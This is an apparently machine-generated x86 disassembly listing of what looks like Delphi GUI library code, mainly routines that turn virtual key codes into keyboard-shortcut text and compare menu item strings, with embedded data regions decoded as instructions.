sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455371
mov eax [ ebp - 0x4 ]
call sub_403390
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
jmp r-xdata
sub_4553d8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
mov edx esi
call sub_454b48
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_455424
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_455449
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455450
retn
sub_455ac1
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
and al 0x95
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
jmp eax
sub_455b30
mov esp 0x8400458d
xchg ebp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
add [ eax ] bl
inc edx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
call eax
lea eax [ ebp ]
movsb [ edi ] [ esi ]
xchg ebp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x58656c62
mov [ ecx ] eax
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
les edx [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
xor eax 0x3b6c0040
inc edx
add ah ch
ja r-xdata
inc edx
add ah ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ esi - 0x45ffbaa4 ] ah
pop esp
inc ebp
add [ eax ] bl
add [ eax ] al
sbb [ ebp + 0x42180041 ] bl
je r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
nop
mov al [ 0xffffffffbd340045 ]
inc ecx
add [ eax ] ah
inc edx
add [ eax - 0x44 ] dl
inc ecx
add [ eax + 0x540045a8 ] bh
test eax 0x3f080045
jae r-xdata
insd
xor [ esi + 0x45 ] dl
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add ah dh
lahf
inc ebp
add [ eax - 0x1bffba58 ] ah
mov al [ 0xffffffffa8d00045 ]
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
sbb [ edi ] bh
jb r-xdata
xchg esp eax
pop esp
inc ebp
add ah al
pop esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
mov eax 0x98004555
add [ eax ] al
[ eax + 0x1ff0000 ]
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc ebp
add [ eax ] cl
dec ecx
je r-xdata
aas
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
pop eax
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x5cc40045 ] dl
sub_455cac
out dx eax
dec eax
mov al [ 0xffffffffa0f00045 ]
inc ebp
add al bl
movsb [ edi ] [ esi ]
inc ebp
add [ 0x6e654d54 ] al
jne r-xdata
lahf
inc ebp
add [ eax - 0x1bffba58 ] ah
pop esp
inc ebp
add [ edi ] al
add eax 0x6e654d54
jne r-xdata
pushad
pop esp
inc ebp
add [ esi + ebx * 4 ] dl
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
add [ ebp + ebp * 4 + 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add al ch
push esi
inc ebp
add [ ebp + ebp * 4 + 0x45 ] dh
int3
add ah cl
pop eax
inc ebp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
mov al [ 0xffffffffa8d00045 ]
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
add ah ah
add [ eax ] al
add [ esp + ebx * 2 ] cl
inc ebp
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
nop
mov al [ 0xffffffffbd340045 ]
inc ecx
add [ eax ] ah
inc edx
add [ eax - 0x44 ] dl
inc ecx
add [ eax + 0x540045a8 ] bh
test eax 0x3f080045
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add ah dh
lahf
inc ebp
add [ eax - 0x6fffba58 ] ah
scasb [ edi ]
inc ebp
add ah dl
lodsd [ esi ]
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcr [ eax + 0x700455d ] 0x9
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x4c756e65
pop ebp
inc ebp
add al al
pop esp
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
inc eax
add [ ebp + ebx * 2 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x455d ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6000455d ] cl
adc [ eax ] al
inc eax
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
mov al [ 0x4800453e ]
add [ eax ] al
[ eax ]
test eax 0x10045
call 0xffffffff9445a336
lodsd [ esi ]
inc ebp
add [ ebp + ebp * 4 + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
push [ ebp + ebp * 4 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
adc [ ebp + 0x10045 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
inc ebp
add [ eax ] cl
add bh bh
sbb [ ecx + 0x10045 ] ch
adc [ gs : eax + 0x300041 ] cl
add bh bh
cld
lodsb [ esi ]
inc ebp
add ah dh
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
pushad
pop edi
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ah
pop esi
inc ebp
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
push esp
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
in al 0x5e
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
call [ eax ]
lodsd [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop edi
outsd
and al 0x5f
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
pop edi
jo r-xdata
inc ebp
add al dl
test al 0x45
add ah al
mov ch 0x45
add [ esi + esi * 4 + 0x45 ] bh
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
inc ebp
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ ebp + ebp * 4 - 0x525bffbb ] dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc edx
add [ eax - 0x44 ] dl
add [ ebx + esi + 0x40 ] al
add [ eax + 0x340045b5 ] dl
mov ebp 0x3e200041
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] bh
add [ eax ] al
or al 0x5c
inc ebp
add [ eax ] bl
inc edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] dh
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ ebp + ebp * 4 + 0x45 ] dh
outsb
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add al ah
xor eax 0x33280040
inc eax
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ah
pop edi
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add ah ah
sbb [ edx + 0x42 ] al
test [ eax + 0x45 ] ah
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
outsd
int3
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
fsub [ edi + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
jne r-xdata
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
pop edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
call [ eax ]
lodsd [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
mov al [ 0x4800453e ]
add [ eax ] al
[ eax ]
test eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add al bl
xor eax 0x35e40040
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xec65646f
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
mov [ ecx ] al
xor [ eax ] al
add bh bh
cld
lodsb [ esi ]
inc ebp
add ah dh
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
mov [ ecx ] al
fdiv [ ebp - 0x4a1fffbb ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
in al dx
add eax 0x75411100
je r-xdata
call 0xffffffff9445a647
lodsd [ esi ]
inc ebp
add [ ebp + ebp * 4 + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
inc ecx
add [ eax + 0x540045a8 ] bh
test eax 0x3f080045
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ esi * 4 - 0x575fffbb ] bl
inc ebp
add ah ah
mov al [ 0xffffffffa8d00045 ]
inc ebp
nop
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
nop
mov ch 0x45
add [ edi * 4 + 0x3e200041 ] dh
inc ebp
add [ ebp + 0x60300040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax + 0x5f ] esp
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
arpl [ ebp ] ax
or [ eax ] al
add [ eax ] al
fsub st4
inc edx
jo r-xdata
inc ebx
push 0x65676e61
pop eax
mov [ ecx ] eax
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2065646f
pop edi
inc ebp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
pop edi
inc ebp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al bl
mov ah 0x41
add [ esi + esi * 4 + 0x41 ] bh
add ah bl
mov es [ ecx ]
fdiv [ 0x35e40040 ]
outsb
hlt
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
insd
outsb
je r-xdata
pushad
inc ebp
add al al
pop esp
inc ebp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
add [ eax + edi * 4 - 0x4ad3ffbf ] bh
inc ecx
add [ eax - 0x6bffbe4b ] ch
scasd [ edi ]
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
rcl ah 0x62
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
bound eax [ ebp ]
adc al 0x0
add [ eax ] al
fmul [ esi + 0x35d80041 ]
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
fdiv [ ecx + eax * 2 + 0x41b67c00 ]
add [ esi + 0x42 ] bh
add [ esi + 0x42 ] bl
add [ eax - 0x1a ] cl
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
sbb dh ah
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] bl
out 0x42 al
imul esi [ ebx + 0x74 ] 0x45634090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x45 ] cl
add [ eax ] cl
add [ eax ] al
add al bl
in al 0x42
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 4 + 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push esi
inc ebp
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
call 0x7445a621
lodsd [ esi ]
inc ebp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop esi
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b058
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45638c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4457fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b058
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4563e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45641c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404120
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404390
sub_456470
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_456659
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404308
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041b8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404308
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404308
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404120
mov eax esi
call sub_404120
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041b8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4085c0
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40442c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45641c
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e8
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e8
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4043e8
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4043e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456660
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
sub_456674
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4043e0
push eax
mov eax edi
call sub_4043e0
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4043e0
push eax
mov eax edi
call sub_4045e0
push eax
mov eax [ esi ]
call sub_4045e0
pop edx
pop ecx
call sub_408338
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4043e0
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404680
sub_4566d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_4567ab
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_456674
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_456674
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_456674
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_456674
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4567b2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_456470
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4082e8
test eax eax
jne r-xdata
sub_4567e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_458d88
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_458d98
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_456848
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_458d88
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_458d88
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_458d98
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_458d98
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4567e8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4567e8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_458d98
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
